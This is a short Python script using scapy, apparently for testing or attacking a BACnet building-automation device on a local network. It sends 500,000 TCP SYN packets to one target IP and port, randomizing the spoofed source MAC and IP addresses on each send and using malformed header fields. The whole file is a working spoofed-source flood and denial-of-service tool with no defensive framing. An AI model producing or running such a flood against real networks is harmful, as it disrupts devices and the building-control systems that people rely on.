#import re
from time import sleep
import binascii
import random, string
from scapy.all import *

M_MAC = '00:05:1b:a8:6d:d3'#自分のMACアドレス
sample_string='0123456789abcdef0123456789abcdef'

PROTO_NUM = 17 #icmp:1 tcp:6 udp:17
TH1 = 71 #WriteProperty:71

IF = "en8"
#FILTER = "ether src "+ T_MAC1 +" and not ether src "+ M_MAC

eth = Ether()
eth.src = 'b8:27:eb:3c:2e:c9'
eth.dst = 'ff:ff:ff:ff:ff:ff'
eth.type = 2048

ip = IP()
ip.version =4
ip.tos = 0x0
ip.ihl = 136
ip.id = 19355
ip.flags = 0x001
ip.frag = 8
ip.ttl = 64
ip.proto = 'tcp'
ip.src = '192.168.2.11'
ip.dst = '192.168.1.10'

tcp = TCP()
tcp.sport = 80
tcp.dport = 55555# bacnet
tcp.flags='S'
tcp.seq=100

pkt = eth/ip/tcp

tmp1 = pkt[Ether].src
tmp2 = pkt[IP].src
tmp3 = pkt[IP].dst

for i in range(0,500000):
    sendp(pkt,iface=IF)
    array = tmp1.split(':')
    array[0]=''.join(random.choices(sample_string,k=2))
    array[1]=''.join(random.choices(sample_string,k=2))
    array[2]=''.join(random.choices(sample_string,k=2))
    array[3]=''.join(random.choices(sample_string,k=2))
    array[4]=''.join(random.choices(sample_string,k=2))
    array[5]=''.join(random.choices(sample_string,k=2))
    tmp1 = ':'.join(array)
    pkt[Ether].src = tmp1

    array = tmp2.split('.')
    array[0] = str(random.randint(0,255))
    array[1] = str(random.randint(0,255))
    array[2] = str(random.randint(0,255))
    array[3] = str(random.randint(0,255))
    tmp2 = '.'.join(array)
    pkt[IP].src = tmp2

    #array = tmp3.split('.')
    #array[0] = str(random.randint(0,255))
    #array[1] = str(random.randint(0,255))
    #array[2] = str(random.randint(0,255))
    #array[3] = str(random.randint(0,255))
    #tmp3 = '.'.join(array)
    #pkt[IP].dst = tmp3

    
    pkt[IP].id = random.randint(0,20000)
    pkt[IP].frag += 800
    pkt[TCP].seq +=1
    #pkt = eth/ip/tcp/on_01

